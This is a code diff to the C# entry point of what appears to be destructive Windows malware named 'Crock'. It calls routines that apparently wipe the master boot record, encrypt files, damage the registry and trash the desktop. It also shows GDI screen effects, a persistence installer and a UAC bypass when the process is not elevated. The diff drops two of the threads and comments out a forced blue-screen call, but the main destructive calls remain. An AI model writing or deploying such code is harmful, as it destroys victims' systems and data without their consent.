@@ -10,18 +10,16 @@ namespace Crock
         {
             Killer.MBR();
             Addition.RegFun();
-            Killer.AntiCombo();
             var rule = new Rules();
-            new Thread(() => Misc.InputFuck()).Start();
             new Thread(() => rule.ShowDialog()).Start();
             new Thread(() => Addition.TrashDestop()).Start();
             new Thread(() => Crypt.Main_Encrypt()).Start();
             new Thread(() => Effect.GDI_payloads()).Start();
             Killer.RegFuck();
-            Killer.BSOD();
+            //Killer.BSOD();
         }
 
-        static void Main()
+        private static void Main()
         {
             if (!Addition.IsInstalledAR())
                 Addition.InstallAR();
@@ -35,7 +33,9 @@ namespace Crock
             if (isElevated)
             {
                 UseExp();
-            } else {
+            }
+            else
+            {
                 Addition.UAC();
             }
         }
